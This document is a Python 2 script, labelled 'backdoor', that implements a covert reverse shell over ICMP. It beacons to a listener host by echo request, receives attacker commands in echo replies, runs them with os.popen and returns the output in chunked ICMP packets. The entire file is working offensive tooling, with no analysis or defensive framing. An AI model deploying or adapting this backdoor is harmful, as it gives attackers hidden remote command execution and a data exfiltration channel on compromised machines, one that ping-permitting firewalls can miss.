#!/usr/bin/env python

import os
import sys
import socket
import struct
import select
import time
import string
import argparse

#Constants and global variables
ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0
PROTO_CODE = 0
HEADER_SIZE = 28
MAX_PACK_SIZE = 1024
ACTIVE_TIMEOUT = 100000 
ACTIVE = 0

#Generating a checksum
def checksum(source_string):
    sum = 0
    countTo = (len(source_string)/2)*2
    count = 0
    while count<countTo:
        thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
        sum = sum + thisVal
        sum = sum & 0xffffffff
        count = count + 2
    if countTo<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff
    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer
 
#Receiving a (maybe truncated) command 
def receiveCmd(connectionSocket, ownID, timeout): 
    timeLeft = timeout
    if(ACTIVE == 1): #If another command has already been received wait longer for the next one
        timeLeft = ACTIVE_TIMEOUT
    rcvBuffer = ""
    #Receive until empty package or timeout
    while True:
        startedSelect = time.time()
        whatReady = select.select([connectionSocket], [], [], timeLeft)
        howLongInSelect = (time.time() - startedSelect)
        if whatReady[0] == []:
            return
        #Receive and unpack
        recPacket, addr = connectionSocket.recvfrom(MAX_PACK_SIZE + HEADER_SIZE)  
        icmpHeader = recPacket[20:HEADER_SIZE]
        type, code, checksum, packetID, sequence = struct.unpack(
            "bbHHh", icmpHeader)
        #Discard if its no ICMP_ECHO_REPLY
        if(type != ICMP_ECHO_REPLY): 
            continue
        #If packet ID matches the own ID, add its command to the buffer
        if packetID == ownID:
            cmd = recPacket[HEADER_SIZE:]
            #Receiving an "empty" command means the transmission is completed
            if(cmd == ""):
                return rcvBuffer
            rcvBuffer += cmd
        #Update time and check for timeout
        timeLeft = timeLeft - howLongInSelect
        if(timeLeft <= 0):
                return

#Sending a single package with msg
def sendPackage(connectionSocket, addr, ownID, msg):
    #Pack header with checksum 0, add data and then generate overall checksum
    chcksum = 0
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, PROTO_CODE, chcksum, ownID, 1) 
    data = msg 
    chcksum = checksum(header + data)
    header = struct.pack(
        "bbHHh", ICMP_ECHO_REQUEST, PROTO_CODE, socket.htons(chcksum), ownID, 1)
    packet = header + data
    #send finished package
    connectionSocket.sendto(packet, (addr, 1)) #1 as dummy port 

#Sending an answer in one ore more packages
def sendResponse(connectionSocket, host, ownID, response): 
    addr  =  socket.gethostbyname(host)
    #Determine length of answer
    remaining = len(response)
    while(remaining > 0):
        buf = ""
        #If the answer is too long for a single package it has to be truncated
        if (remaining > MAX_PACK_SIZE):
            buf = response[0:MAX_PACK_SIZE]
            response = response[MAX_PACK_SIZE:]
        #Else it can be sent in a single package
        else:
            buf = response 
        sendPackage(connectionSocket, addr, ownID, buf)
        remaining -= len(buf)
    #Sending empty package to signal end of transmission
    sendPackage(connectionSocket, addr, ownID, "") 
    
#main functionality
def revShell(host, timeout):
    global ACTIVE
    icmp = socket.getprotobyname("icmp")
    lastResponse = "[*] Reverse shell connected!" 
    while (True):
        try:
            try:
                try:
                    connectionSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
                except socket.error, (errno, msg):
                    if errno == 1:
                        msg = msg + ( ": You have to be root.")
                        raise socket.error(msg)
                    raise
                ownID = os.getpid() & 0xFFFF
                #Sending last answer to the attacker
                sendResponse(connectionSocket, host, ownID, lastResponse) 
                #Receive a new command
                cmd = receiveCmd(connectionSocket, ownID, timeout)
                connectionSocket.close()
            except socket.gaierror, e:
               print("%s\n" % e[1])
               break
            #No command means timeout
            if cmd  ==  None:
               #If there was an active connection reset the status and send initial message again
               if(ACTIVE == 1):
                   ACTIVE = 0
                   lastResponse = "[*] Reverse shell connected!"
               continue
            #A command has been received
            else:
               ACTIVE = 1
               #If it was a 'cd' change the working directory
               if(len(cmd) >= 4 and cmd[0:3] == "cd "):
                    newPath = cmd[3:]
                    os.chdir(newPath)
                    lastResponse = "[*] Changed cwd to " + newPath
               #Reset active status at 'exit'
               elif(cmd == "exit"):
                    ACTIVE = 0
                    lastResponse = "[*] Reverse shell connected!"
               #Execute all other commands directly
               else:
                   lastResponse = os.popen(cmd).read() 
        except KeyboardInterrupt:
           break

def main():
    parser = argparse.ArgumentParser(description='backdoor')
    parser.add_argument('-t','--timeout', type=float, default=3, help= 'timeout in seconds')
    parser.add_argument('host', metavar='<host>', type=str, help='host running the listener')
    args = parser.parse_args()
    cwd = os.getcwd()
    revShell(args.host, args.timeout)

 
if __name__ == '__main__':
    main()
